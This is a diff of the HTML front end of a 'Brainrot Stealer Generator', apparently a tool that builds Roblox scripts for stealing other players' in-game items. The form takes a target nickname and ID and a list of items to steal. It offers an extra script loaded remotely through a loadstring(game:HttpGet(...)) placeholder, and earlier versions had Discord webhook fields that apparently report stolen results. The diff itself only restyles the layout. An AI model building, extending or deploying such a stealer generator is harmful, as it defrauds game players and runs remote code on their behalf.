@@ -3,21 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brainrot Stealer Generator</title>
+    <title>Brainrot Generator</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <h1>🎯 Генератор Brainrot Stealer</h1>
         
-        <div class="form-group">
-            <label>👤 Roblox Nickname (для поиска)</label>
-            <input type="text" id="robloxNick" placeholder="sdfgrijjkdsfg">
-        </div>
-        
-        <div class="form-group">
-            <label>🆔 Roblox User ID (основной)</label>
-            <input type="text" id="robloxId" placeholder="8986116710">
+        <div class="form-row">
+            <div class="form-group">
+                <label>👤 Roblox Nickname</label>
+                <input type="text" id="robloxNick" placeholder="sdfgrijjkdsfg">
+            </div>
+            
+            <div class="form-group">
+                <label>🆔 Roblox User ID</label>
+                <input type="text" id="robloxId" placeholder="8986116710">
+            </div>
         </div>
         
         <div class="form-group">
@@ -26,43 +28,31 @@
         </div>
         
         <div class="form-group">
-            <label>🏷️ Webhook Username</label>
-            <input type="text" id="webhookName" value="dragono лутатель ZET ZOV">
-        </div>
-        
-        <div class="form-group">
-            <label>🖼️ Webhook Avatar (ссылка на картинку)</label>
-            <input type="text" id="webhookAvatar" value="https://cdn.discordapp.com/attachments/1487215421194240000/1487411974097600603/drdd.jpg">
-        </div>
-        
-        <div class="form-group">
             <label>🎯 Таргет брейнроты (STEAL)</label>
             <div class="select-buttons">
-                <button type="button" id="selectAllBtn" class="small-btn">✅ Выбрать всех</button>
-                <button type="button" id="deselectAllBtn" class="small-btn">❌ Убрать всех</button>
+                <button type="button" id="selectAllBtn" class="btn-small">✅ Выбрать всех</button>
+                <button type="button" id="deselectAllBtn" class="btn-small">❌ Убрать всех</button>
             </div>
-            <div class="search-box">
-                <input type="text" id="searchBrainrots" placeholder="Поиск...">
-            </div>
+            <input type="text" id="searchBrainrots" class="search-input" placeholder="🔍 Поиск...">
             <div class="checkbox-grid" id="brainrotsList"></div>
         </div>
         
         <div class="form-group">
             <label>📦 Дополнительный скрипт</label>
             <div class="radio-group">
-                <label><input type="radio" name="scriptType" value="22s" checked> 22s Hub (pastebin)</label>
-                <label><input type="radio" name="scriptType" value="custom"> Свой скрипт</label>
+                <label class="radio-label"><input type="radio" name="scriptType" value="22s" checked> 22s Hub</label>
+                <label class="radio-label"><input type="radio" name="scriptType" value="custom"> Свой скрипт</label>
             </div>
             <textarea id="customScript" placeholder="loadstring(game:HttpGet('ссылка'))()" style="display: none;"></textarea>
         </div>
         
         <div class="buttons">
-            <button id="generateBtn">🚀 СГЕНЕРИРОВАТЬ</button>
-            <button id="copyBtn" style="display: none;">📋 КОПИРОВАТЬ</button>
+            <button id="generateBtn" class="btn-primary">🚀 СГЕНЕРИРОВАТЬ</button>
+            <button id="copyBtn" class="btn-copy" style="display: none;">📋 КОПИРОВАТЬ</button>
         </div>
         
         <div id="output" style="display: none;">
-            <h3>📜 Скрипт готов:</h3>
+            <h3>📜 Сгенерированный скрипт:</h3>
             <pre id="scriptOutput"></pre>
         </div>
     </div>
